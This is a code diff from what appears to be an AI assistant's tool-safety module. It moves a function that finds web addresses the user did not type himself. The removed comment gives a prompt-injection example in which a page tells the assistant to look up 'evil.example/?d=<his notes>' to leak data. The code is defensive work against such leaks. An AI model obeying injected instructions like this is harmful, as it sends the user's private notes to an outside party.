@@ -267,17 +267,7 @@ export const CHANGES_AFTER_OUTSIDE = new Set(['remember', 'correct', 'do_task', 
 /** S2 2.7: these return old conversation or a session's output, which may hold someone else's words. */
 export const BRINGS_OUTSIDE = new Set(['search_memory', 'what_we_talked_about', 'claude_code_status', 'browser_history', 'watch_video']);
 
-/**
- * S2 2.5: the web addresses a lookup names that he did not type himself. A page that says "now look up
- * evil.example/?d=<his notes>" is how a reply leaks without anyone clicking anything.
- */
-export function untypedAddresses(question: string, typed: string): string[] {
-  const hosts = (t: string) => [...String(t ?? '').toLowerCase().matchAll(/(?:https?:\/\/)?((?:[a-z0-9-]+\.)+[a-z]{2,})(?=[\/:?#\s]|$)/g)].map((m) => m[1]!.replace(/^www\./, ''));
-  // A file name is not an address: "node.js" or "notes.md" in a question is not somewhere to go.
-  const FILE = /\.(js|ts|md|py|txt|json|exe|zip|pdf|png|jpe?g|css|html?|cs|csproj|sln|ps1|bat|cmd|log|csv|docx?|xlsx?)$/;
-  const his = new Set(hosts(typed));
-  return [...new Set(hosts(question))].filter((h) => !FILE.test(h) && !his.has(h) && ![...his].some((x) => h.endsWith('.' + x)));
-}
+export { untypedAddresses } from './addresses.ts';
 
 /** Tools whose use is written to the activity log. Reading the time or the weather is not worth a line. */
 const LOGGED = new Set(['open', 'run', 'start_claude', 'read_window', 'look_at_window', 'read_clipboard', 'send_to_phone',
